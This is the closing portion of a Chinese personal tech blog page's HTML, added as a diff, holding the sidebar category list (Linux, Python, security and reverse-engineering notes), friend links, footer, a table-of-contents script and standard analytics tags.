+<a href="https://www.cnblogs.com/LyShark/category/1219787.html" class="category-item-link" rel="" target="">Linux 服务配置学习笔记(46)</a>
+
+                    
+                </li>
+                                            <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/LyShark/category/1340048.html" class="category-item-link" rel="" target="">Linux 系统使用学习笔记(27)</a>
+
+                    
+                </li>
+                                            <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/LyShark/category/2038071.html" class="category-item-link" rel="" target="">PHP 安全开发笔记(10)</a>
+
+                    
+                </li>
+                                            <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/LyShark/category/1219800.html" class="category-item-link" rel="" target="">Python 编程笔记(39)</a>
+
+                    
+                </li>
+                                            <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/LyShark/category/2038873.html" class="category-item-link" rel="" target="">Python 黑客编程(18)</a>
+
+                    
+                </li>
+                                            <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/LyShark/category/1789194.html" class="category-item-link" rel="" target="">Visual C# 开发笔记(12)</a>
+
+                    
+                </li>
+                                            <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/LyShark/category/1496783.html" class="category-item-link" rel="" target="">Web 前端开发笔记(14)</a>
+
+                    
+                </li>
+                                            <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/LyShark/category/1496909.html" class="category-item-link" rel="" target="">Win32 内核编程笔记(11)</a>
+
+                    
+                </li>
+                                            <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/LyShark/category/1466600.html" class="category-item-link" rel="" target="">动手写操作系统(1)</a>
+
+                    
+                </li>
+                                            <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/LyShark/category/1496795.html" class="category-item-link" rel="" target="">汇编与反汇编笔记(20)</a>
+
+                    
+                </li>
+                                            <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/LyShark/category/1374452.html" class="category-item-link" rel="" target="">软件逆向分析教程(27)</a>
+
+                    
+                </li>
+                                            <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/LyShark/category/1339134.html" class="category-item-link" rel="" target="">渗透与网络安全笔记(58)</a>
+
+                    
+                </li>
+                                            <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/LyShark/category/1231445.html" class="category-item-link" rel="" target="">数据库使用笔记(26)</a>
+
+                    
+                </li>
+                                            <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/LyShark/category/1496792.html" class="category-item-link" rel="" target="">网络设备配置笔记(9)</a>
+
+                    
+                </li>
+                                            <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/LyShark/category/2010120.html" class="category-item-link" rel="" target="">我的安全工具发布(5)</a>
+
+                    
+                </li>
+                                            <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/LyShark/category/1496775.html" class="category-item-link" rel="" target="">游戏逆向分析教程(27)</a>
+
+                    
+                </li>
+                                            <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/LyShark/category/1923803.html" class="category-item-link" rel="" target="">运维故障处理(4)</a>
+
+                    
+                </li>
+                                            <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/LyShark/category/2009969.html" class="category-item-link" rel="" target="">转载与收藏(17)</a>
+
+                    
+                </li>
+                                        
+        </ul>
+    </div>    <div class="catList">
+        <h3 class="catListTitle">
+            
+友情链接
+
+
+
+        </h3>
+        <ul>
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://hackergu.com/" class="category-item-link" rel="nofollow noopener noreferrer" target="_blank">HackerGu</a>
+
+                    
+                </li>
+                                            <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://blog.linux-code.com/" class="category-item-link" rel="nofollow noopener noreferrer" target="_blank">北慕城南</a>
+
+                    
+                </li>
+                                        
+        </ul>
+    </div></div>
+
+<!-- 最新评论 -->
+
+
+
+<!-- 阅读排行榜 -->
+
+
+<!-- 评论排行榜 -->
+
+
+<!-- 推荐排行榜 -->
+</div>
+                    <script>loadBlogSideColumn();</script>
+                    <!-- end:  SingleColumn -->
+                </div>
+            </div>
+        </div>
+        <div class="clear"></div>
+    </div>
+    <div class="clear"></div>
+    <div id="footer">
+        <!--done-->
+Copyright © 2021 lyshark
+<br /><span id="poweredby">Powered by .NET 6 on Kubernetes</span>
+
+    </div>
+</div>
+
+    <div id="page_end_html">
+        <script language="javascript" type="text/javascript">
+function GenerateContentList()
+{
+    var jquery_h3_list = $('#cnblogs_post_body h3');
+    if(jquery_h3_list.length&gt;0)
+    {
+        var content = '&lt;a rel="nofollow"  name="_labelTop"&gt;&lt;/a&gt;';
+        content    += '&lt;div id="navCategory"&gt;';
+        content    += '&lt;p style="font-size:18px"&gt;&lt;b&gt;文章阅读目录&lt;/b&gt;&lt;/p&gt;';
+        content    += '&lt;ul&gt;';
+        for(var i =0;i&lt;jquery_h3_list.length;i++)
+        {
+            var go_to_top = '&lt;div style="text-align: right"&gt;&lt;a rel="nofollow"  href="#_labelTop"&gt;回到顶部&lt;/a&gt;&lt;a rel="nofollow"  name="_label' + i + '"&gt;&lt;/a&gt;&lt;/div&gt;';
+            $(jquery_h3_list[i]).before(go_to_top);
+            var li_content = '&lt;li&gt;&lt;a rel="nofollow"  href="#_label' + i + '"&gt;' + $(jquery_h3_list[i]).text() + '&lt;/a&gt;&lt;/li&gt;';
+            content += li_content;
+        }
+        content    += '&lt;/ul&gt;';
+        content    += '&lt;/div&gt;';
+        if($('#cnblogs_post_body').length != 0 )
+        {
+            $($('#cnblogs_post_body')[0]).prepend(content);
+        }
+    }
+}
+GenerateContentList();
+</script>
+<div style="display:none;">
+<script type="text/javascript" src="https://s4.cnzz.com/z_stat.php?id=1280731970&amp;web_id=1280731970"></script><script src="https://c.cnzz.com/core.php?web_id=1280731970&amp;t=z" charset="utf-8" type="text/javascript"></script><a href="https://www.cnzz.com/stat/website.php?web_id=1280731970" target="_blank" title="站长统计">站长统计</a>
+</div>
+    </div>
+
+    <input type="hidden" id="antiforgery_token" value="CfDJ8GsLOKiGtk1Au0UP1SouGdX3QIAP8BlAcPCyIt3gJheP3lHHMN2BUTvhmREQqBxTeBKqIkvEPgqD53Y5FYiUu9WVSSOSlHGzPSVB92dZpV2cvq08MRaZbkE1Bx_j-oqWNG8aFnOOec9Au9WOBYp008E" />
+    <script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-476124-1"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    var kv = getGACustom();
+    if (kv) {
+        gtag('set', kv);
+    }
+    gtag('config', 'UA-476124-1');
+    </script>
+    <script defer="" src="https://hm.baidu.com/hm.js?866c9be12d4a814454792b1fd0fed295"></script>
+
+<script type="text/javascript">getFollowStatus('8a55a89b-7bd3-481e-d52e-08d5866282ce');</script></body></html>
